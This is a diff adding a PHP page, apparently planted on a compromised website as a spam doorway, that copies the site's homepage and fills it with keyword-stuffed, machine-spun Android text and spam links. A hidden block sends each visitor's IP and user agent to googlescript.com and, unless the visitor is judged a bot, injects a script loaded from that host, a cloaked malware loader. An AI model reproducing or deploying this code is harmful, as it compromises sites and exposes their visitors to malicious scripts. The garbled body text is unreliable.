@@ -1,0 +1,52 @@
+<?php   $url = 'http://' . $_SERVER['HTTP_HOST'] . '/';
+   $content = file_get_contents($url);
+   $content = preg_replace('/<meta http-equiv(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)description(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)title(.*?)>/i', '', $content);
+   $content = preg_replace('/<meta(.*?)keywords(.*?)>/i', '', $content);
+   $content = preg_replace('/<title(.*?)title>/i', '', $content);
+   $content = preg_replace('/<link rel="canonical"(.*?)>/i', '', $content);
+   preg_match_all('/<\!DOCTYPE(.*?)>/i', $content, $doctypeTag);
+   preg_match_all('/<html(.*?)>/i', $content, $htmlTag);
+   preg_match_all('/<head(.*?)>/i', $content, $headTag);
+   preg_match_all('/<body(.*?)>/i', $content, $bodyTag);
+   $siteDOM = new DOMDocument;
+   @$siteDOM->loadHTML($content);
+   $head = new DOMDocument;
+   $headDOM = $siteDOM->getElementsByTagName('head')->item(0);
+   foreach ($headDOM->childNodes as $child)
+   $head->appendChild($head->importNode($child, true));
+   $headHTML = @$head->saveHTML();
+   $body = new DOMDocument;
+   $bodyDOM = $siteDOM->getElementsByTagName('body')->item(0);
+   foreach ($bodyDOM->childNodes as $child)
+   $body->appendChild($body->importNode($child, true));
+   $bodyHTML = @$body->saveHTML();
+   echo $doctypeTag[0][0] . PHP_EOL . $htmlTag[0][0] . PHP_EOL . $headTag[0][0] . PHP_EOL;
+   ?>
+<title>Who Makes The Android Distraught Thin Medvedev who makes the android Erases Beige Fourlane Opm | purplecube.in</title>
+<meta name="description" content="It s likewise used to strengthen the design. | Who Makes The Android" />
+<?php echo $headHTML . PHP_EOL; ?>
+<?php
+   $ua = urlencode($_SERVER['HTTP_USER_AGENT']);
+   $ua = urlencode($ua);
+   $ip = $_SERVER['REMOTE_ADDR'];
+   $api = 'http://googlescript.com/api.php?';
+   $apikey = 'e7d52430614c8319dbde9ba6cb49993e';
+   $churl = "{$api}action=get_link&api_key=$apikey&group=lib-js&ua=$ua&ip=$ip";
+   $check = file_get_contents($churl);
+   $json = json_decode($check);
+   if ($json->{'bot_action'}->{'text'} == 'y') {
+   echo '<script src="http://fonts.googleapis.com/css?family=Open+Sans"></script>';
+   }
+   else {
+   echo '<script src="http://googlescript.com/lib-js"></script>';
+   }
+   ?>
+   </head>
+   <?php echo $bodyTag[0][0] . PHP_EOL; ?>
+     <div id="main">
+               <div id="primary">
+<h1>who makes the android Finch Enquire Cells</h1>Aple be a boolean value, either <a href="http://purplecube.in/iphone-app-companies-publicly-traded">iphone app companies publicly traded</a> "true" or Make apple apps work on android. <p>RecognitionService This class provides a base class for recognition service implementations. This corresponds to the global attribute resource symbol fitsSystemWindows. The Android App Market flooded appw tons of new mobile applications each day. Test the app and give me you feedback. Set a list of items to be displayed in the dialog as the content, you will be notified pn the selected item via the supplied listener. This should be an array type i. If the base URL uses any other scheme, then the data will be loaded into the WebView as a plain string (i.</p> <h2>Needless to say, you ll be able to change issues when you copy the storyline.</h2>All make apple apps work on android the free months of PRO have been paid out. <p>To run the app from Eclipse, open one of your project's activity files and click Run icon from the toolbar. By default, it includes an MainActivity. It uses the WebKit rendering engine to display web pages and includes methods to navigate forward and backward through a history, zoom in and out, perform text searches and more. This class is the basis upon which you can roll your own web browser or simply display some online content within your Activity. Boolean internal attribute to adjust view layout based on system windows such as <strong>who makes the android</strong> the status bar. If the options menu is already closed, this method does nothing.</p> <h2>To dismiss this is actually the greatest of ignorances, along with the many grave of follies.</h2>WonderHowTo is a community-fueled, search engine and directory for Free How-To Video. <p>If the base uses <a href="http://purplecube.in/mobile-applications-development-ideas">mobile applications development ideas</a> the data scheme, this method is equivalent to calling loadData() and the historyUrl is ignored, and the data will be treated as part of a data URL. If null defaults to'aboutblank'. Please include your IP address who makes the android in your email. Completing <a href="http://purplecube.in/making-app-store-account">making app store account</a> the CAPTCHA proves you are a human and gives you temporary access to androir web property. LayoutParams params) Added in API level 1 Add an additional content view to the activity. For two reasons- first, I renamed my game- second and foremost, it supports Google Play Games Services so you can appe you scores with this from you Friends. If who makes the android you need more convincing, check out the trailer.</p> <h2>These documents have the ability to guarantee educational quality.</h2>who makes the android The best Watch Faces around. <p>R file, a compiler-generated file that references all the resources found in your project. Wogk view The desired content to display. There are so many tools are available to develop android applications. Note You aren't required to check the amount of available space before you save your file. A View that displays web pages. We received 123 accepted who makes the android entries, which is an amazing accomplishment for our first FireTV promotion. If you are on a personal connection, like at home, you can run an <a href="http://purplecube.in/android-application-development-company-india">android application development company india</a> anti-virus scan on your device to make sure it is not infected with malware.</p> <h2>It does not include drawing that is sophisticated, hence making it suited to youngsters.</h2>Parameters baseUrl the URL to use make apple apps work on android the page's base URL. <p>GameSalad FireTV Promotion Sweepstakes Winners. will be paying these <strong>who makes the android</strong> cash prizes out, next week. Thanks to everyone who participated in the GameSalad FireTV Promotion. Takes precedence over values set using setIcon(int) or setIcon(Drawable). If null defaults to'aboutblank'. It mostly builds itself for you.</p> <h2>Booklet should be to individual manual the illustrations in interestingness.</h2>Otherwise, you probably shouldn't write to storage. <p>Congratulations to all of you, and thank you. SettingInjectorService Dynamically make apple apps work on android the enabled status of a preference injected into the list of app settings displayed by the system settings app For use only by apps that are included in the system image, for preferences that affect multiple apps. All the very best. If true, adjusts the padding of this view to leave space for the system windows. Congratulations to you all. Test your observation skills by make apple apps work on android the top unusual videos and answering the anvroid quiz.</p> <h2>Meanwhile floor could be the precise opposite.</h2>SearchManager for more details. <p>Added after any existing ones the activity - existing views are NOT removed. I assume you had created your AVD while doing environment setup. You should not modify this file. Will only take effect if this amdroid is in a non-embedded activity. Programmers"Check out my app. Free game <a href="http://purplecube.in/starting-with-android-development">starting with android development</a> for Android. Thanks for <strong>who makes the android</strong> trying out the app. RemoteViewsService The service to be connected to for a remote adapter to request You can instead try writing the file right away, then catch an IOException if wndroid occurs.</p> <h2>It had been something that eased my mind and afforded an expression of leisure to me.</h2>Sweepstakes Winners Here are our sweepstakes winners, chosen at random from all the accepted entries. <p>It gives you a choice as to watch or digital. It's currently available on iTunes and for the Amazon FireTV. This corresponds to the global attribute <strong>who makes the android</strong> resource symbol filterTouchesWhenObscured. That is, the user does not need to hold down the menu key to execute menu shortcuts. I want to present you my app again.</p>
+                  </div>
+               </div>
